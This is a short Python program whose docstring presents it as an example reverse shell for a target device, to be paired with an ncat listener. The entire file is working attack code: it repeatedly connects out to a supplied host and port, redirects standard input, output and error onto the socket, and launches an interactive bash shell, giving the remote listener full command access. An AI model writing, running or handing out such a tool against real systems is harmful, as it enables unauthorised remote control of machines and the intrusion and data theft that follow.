"""
This is an example program for opening a reverse shell on
a target device. This isn't the most ideal implementation
as its built using python which may not be avalaible on all devices.
Use with ncat -l -p <port>

Author: Dan McCarthy
Date: 3/24/2025
"""

import sys
import socket
import time
from os import dup2
from subprocess import run

def main():
    """
    Main function create socket using specified ports and excepts shell input
    """

    # Check for target IP and Port
    if len(sys.argv) > 1:
        try:
            host = sys.argv[1]
            port = int(sys.argv[2])
        except ValueError:
            print("ERROR: Please specify valid Port Number(1000-9999)")
            return
    else:
        print("ERROR: Please specify Target Address and Port")
        return
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Continue trying to connect every 15 seconds until successful
    while True:
        try:
            s.connect((host, port))
            break
        except socket.error:
            time.sleep(15)


    dup2(s.fileno(),0) 
    dup2(s.fileno(),1) 
    dup2(s.fileno(),2) 
    run(["/bin/bash","-i"])

if __name__ == "__main__":
    main()